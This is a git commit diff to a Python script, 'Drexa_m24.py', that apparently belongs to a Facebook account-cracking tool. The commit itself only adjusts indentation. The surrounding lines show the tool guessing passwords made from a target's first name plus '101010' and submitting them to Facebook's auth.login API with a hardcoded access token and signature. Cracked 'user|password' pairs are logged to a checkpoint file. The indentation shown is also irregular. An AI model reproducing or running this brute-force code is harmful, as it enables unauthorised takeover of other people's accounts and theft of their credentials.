6627de46de15800df647dfd5a4beae9370802355
Dark Z <70073501+darkzhacker@users.noreply.github.com>
2021-05-05 11:04:00 +0600

    Update Drexa_m24.py

--- Drexa_m24.py
+++ Drexa_m24.py
@@ -404,8 +404,7 @@ def pilih_super():
 															cek.write(user+"|"+pass6+"\n")
 															cek.close()
 															cekpoint.append(user+pass6)
-														
-                                                                                                    else:
+														               else:
 													                           pass8 = (j['first_name']+'101010')
 													                           data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass8)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
 													                           q = json.load(data)
